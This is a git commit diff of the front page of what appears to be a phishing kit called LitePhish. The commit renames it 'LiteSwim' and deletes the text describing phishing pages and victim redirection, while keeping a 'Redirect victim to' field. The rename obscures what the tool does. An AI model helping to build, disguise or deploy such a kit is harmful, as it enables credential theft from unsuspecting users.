f78c3053d4adcff7b1c138c2032cdac7ed4ea985
Saikumar Shetty <73155077+Shettysai@users.noreply.github.com>
2022-08-14 23:16:35 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,15 +1,11 @@
 <script src="modules/script.js"></script>
 <link rel="stylesheet" href="modules/style.css">
 <center>	
-<title>LitePhish</title> 
+<title>LiteSwim</title> 
 <img src=logo.png style=max-width:100%;width:250px;height:300px;><br>
 <!--
-<a style="font-size:20px" href=>LitePhish</a><br>
+<a style="font-size:20px" href=>LiteSwim</a><br>
 -->
-<p style="font-size:20px;"><a href=http://github.com/DarkSecDevelopers/LitePhish target="_blank">LitePhish</a> provides lite weight phishing pages with clean and minimal interface. <br>
-When victim submit form, <br>he/she would be redirected towards the url you specified in input below.<br>
-When textarea is focused, it will automatically copies the link to clipboard.<br>
-You can also click on the page name to check the link.</p>
 <br>
 <input oninput=UpdateRedirects(this.id) placeholder="Redirect victim to ? http://example.com" id="redirect">
 <br><br><br>
